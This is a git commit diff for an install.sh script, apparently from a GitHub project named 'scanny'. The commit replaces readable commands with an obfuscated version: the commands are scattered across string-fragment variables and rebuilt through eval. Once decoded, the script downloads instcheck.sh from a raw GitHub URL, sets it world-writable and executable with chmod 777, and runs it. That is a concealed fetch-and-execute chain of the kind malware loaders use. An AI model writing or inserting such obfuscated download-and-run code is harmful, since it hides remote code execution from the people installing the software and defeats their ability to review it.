2554cff119eeeb1115c0fb438bd0fcc54fe6ff1f
Interceptv <97058207+Interceptv@users.noreply.github.com>
2023-09-30 20:17:23 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,3 @@
-#!/bin/bash
-rm -r instcheck.sh
-wget https://raw.githubusercontent.com/Interceptv/scanny/main/instcheck.sh && chmod 777 instcheck.sh && ./instcheck.sh
+z="
+";Hz='ps:/';Vz='sh &';Kz='hubu';Oz='om/I';cz=' && ';Lz='serc';Cz='stch';Az='rm -';bz='k.sh';Tz='/mai';Pz='nter';Wz='& ch';dz='./in';Xz='mod ';Zz='inst';Uz='n/in';Iz='/raw';Sz='anny';Dz='eck.';az='chec';Gz=' htt';Rz='v/sc';Jz='.git';Yz='777 ';Ez='sh';Mz='onte';Qz='cept';Fz='wget';Bz='r in';Nz='nt.c';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Cz$Dz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$Cz$Dz$Ez"
